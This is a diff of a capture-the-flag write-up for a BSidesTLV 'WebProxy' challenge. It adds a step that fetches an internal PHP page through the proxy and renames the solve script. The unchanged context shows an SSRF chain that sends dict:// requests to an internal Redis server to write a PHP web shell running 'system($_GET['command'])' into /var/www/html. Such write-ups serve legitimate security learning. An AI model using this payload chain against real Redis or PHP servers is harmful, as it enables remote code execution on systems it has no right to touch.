@@ -27,7 +27,25 @@ As a response, we get a table with the following content:
 | NGINX + PHP | 10.42.144.38 | 80 |
 | NGINX + PHP | 10.42.253.181 | 80 |
 
-So, we have a Redis DB and a PHP server on the same IP! It turns out that Redis is [very forgiving](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html) when it comes to accepting commands: Redis is able to ignore a good amount of "noise" and successfully execute the commands hiding inside. In our case, the "noise" is an HTTP request.
+So, we have a Redis DB and a PHP server on the same IP! 
+
+Before we continue to the Redis server, let's take a look at what the PHP server is serving:
+```console
+root@kali:/media/sf_CTFs/bsidestlv/WebProxy# curl https://webproxy.ctf.bsidestlv.com/?csurl=http://10.42.144.38
+<!DOCTYPE html>
+<html>
+<head>
+        <title>NOTICE!!</title>
+</head>
+<body>
+        <h1>Im removing my files every 10 seconds!!</h1>
+</body>
+</html>
+```
+
+Well, that's good to know. Makes perfect sense.
+
+Now, back to Redis. It turns out that Redis is [very forgiving](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html) when it comes to accepting commands: Redis is able to ignore a good amount of "noise" and successfully execute the commands hiding inside. In our case, the "noise" is an HTTP request.
 
 [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#ssrf-exploiting-redis) has a great recipe for exploiting this:
 ```
@@ -71,7 +89,7 @@ print(send_to_proxy(f"http://{IP_ADDR}:80/{SHELL_NAME}?command=cat $(find / -nam
 
 Output:
 ```console
-root@kali:/media/sf_CTFs/bsidestlv/WebProxy# python3 1.py
+root@kali:/media/sf_CTFs/bsidestlv/WebProxy# python3 solve.py
 Sending request to: 'dict://10.42.144.38:6379/CONFIG SET dir /var/www/html'
 Sending request to: 'dict://10.42.144.38:6379/CONFIG SET dbfilename shell.php'
 Sending request to: 'dict://10.42.144.38:6379/SET mykey2 "<\x3Fphp echo \"\\n\"; system($_GET[\'command\']); exit;\x3F>"'
